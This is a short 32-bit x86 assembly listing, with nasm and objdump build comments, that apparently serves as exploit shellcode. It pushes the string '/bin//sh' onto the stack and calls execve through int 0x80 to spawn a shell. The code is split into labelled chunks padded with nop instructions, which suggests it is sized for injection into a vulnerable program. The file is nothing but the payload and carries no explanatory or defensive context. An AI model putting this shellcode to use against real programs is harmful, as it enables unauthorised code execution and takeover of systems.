; nasm -pie -f elf32 -o out.o
; objdump -s ./out.o

_1:
mov eax, 0x804a0e0
xor ecx, ecx
push ecx

_2:
push 0x68732f2f
nop
nop
nop

_3:
push 0x6e69622f
nop
nop
nop

_4:
mov ebx, esp
xor ecx, ecx
xor edx, edx
nop
nop

_5:
xor eax, eax
mov al, 0xb
int 0x80
nop
nop
